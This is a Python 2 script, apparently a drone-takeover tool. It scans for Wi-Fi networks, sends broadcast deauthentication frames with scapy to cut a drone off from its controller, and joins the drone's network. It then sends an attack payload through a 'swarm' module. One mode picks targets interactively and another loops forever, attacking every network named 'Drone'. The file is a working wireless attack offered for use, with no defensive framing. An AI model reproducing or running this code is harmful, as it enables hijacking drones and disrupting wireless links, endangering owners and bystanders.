#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from scapy.all import * 
import re
import os 
import sys
import threading 
from pythonwifi.iwlibs import Wireless, getNICnames
import time 
import swarm


ATTACK_NIC = 'wlan3'
AUTO_TARGET = 'Drone'


class Deauth(threading.Thread):
    def __init__(self, mac=None, w_nic='wlan3'):
        threading.Thread.__init__(self)
        self.mac=mac
        self.iface=w_nic
        self.pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=mac,addr3=mac)/scapy.all.Dot11Deauth()

    def run(self):
        for item in range(0,2):
            scapy.all.sendp(self.pkt, iface=self.iface, count=10, inter=.2, verbose=0)
        print "De-Auth Attack complete"


def get_interface():
   return getNICnames()


def hijack_drone(target_ssid, interface):
   print('Hijacking {} using {}'.format(target_ssid, interface))
   os.system('ifconfig {} down'.format(interface))
   wifi = Wireless(interface)
   wifi.setEssid(target_ssid)
   os.system('ifconfig {} 192.168.1.76 netmask 255.255.255.0'.format(interface))
   os.system('ifconfig {} up'.format(interface))
   os.system('route add -net 192.168.1.0 netmask 255.255.255.0')
   print('Hijack Networking complete')


def monitor_manage(cmd, iface_name):
   os.system('ifconfig {} down'.format(iface_name))
   wifi_card = Wireless(iface_name)
   if cmd == 'start':
      print('Initializing monitor mode')
      wifi_card.setMode('monitor')
   elif cmd == 'stop':
      wifi_card.setMode('managed')
   else:
      print('Unknown command. Use start or stop')
   os.system('ifconfig {} up'.format(iface_name))


def get_targets(w_nic):
   wifi = Wireless(w_nic)
   ap_list = wifi.scan()
   ap_targets = []
   for ap in wifi.scan():
      ap_targets.append(ap.essid[4:].strip().replace('\x00',''))
      # This is becase we are running on a 64bit OS. A little hacky, but it works.
   return ap_targets   


def select_target(target_list):
   i = 0
   print('[+]Available targets')
   for item in target_list:
      print('{}: SSID: {}'.format(i,item))
      i += 1
   i = int(raw_input("Enter target: "))
   return target_list[i]


def get_ap_bssid(w_nic, essid):
   # Not needed if python-wifi gets fixed
   wifi = Wireless(w_nic)
   wifi.setEssid(essid)
   while wifi.getAPaddr() == '00:00:00:00:00:00)':
      time.sleep(1)
   return wifi.getAPaddr()


def perform_attack(attack_nic, ap_mac, target, payload):
   monitor_manage('start', attack_nic)
   d = Deauth(ap_mac, attack_nic)
   d.start()
   print("waiting for deauth to complete")
   d.join()
   print('stopping monitor mode')
   monitor_manage('stop', attack_nic)
   print('monitor mode stopped')
   hijack_drone(target, attack_nic)
   time.sleep(3)
   print('Sending Drone payload')
   swarm.attack_drone(payload)


def gunner_mode():
   print('Starting target scanning')
   interfaces = get_interface()
   #print('Availible interfaces are {}'.format(interfaces))
   wl = ''
   for item in interfaces:
      if 'wlan' in item:
         wl = item
         break
   run = True
   scan = True
   while run is True:
      if scan is True:
         targets = get_targets(wl)
      target = select_target(targets)
      ap_mac = get_ap_bssid(wl, target)
      perform_attack(wl, ap_mac, target,'demon')
      scan = False
      selection = raw_input('Do you want to fire again? Y/n/rescan: ')
      if selection == 'rescan':
         scan = True
      elif selection == 'n':
         run = False


def murica_mode():
   while True:
      targets = get_targets(ATTACK_NIC)
      for target in targets:
         if AUTO_TARGET not in target:
            continue
         ap_mac = get_ap_bssid(ATTACK_NIC, target)
         perform_attack(ATTACK_NIC, ap_mac, target, 'nice')
      print('Attack loop complete, waiting 10 seconds')
      time.sleep(10)

if len(sys.argv) < 2:
   print("{0} gunner|murica".format(sys.argv[0]))
   sys.exit(0)
os.system('service network-manager stop')
os.system('ifconfig {} up'.format(ATTACK_NIC))
sys.argv[1] == 'gunner' and gunner_mode()
sys.argv[1] == 'murica' and murica_mode() 

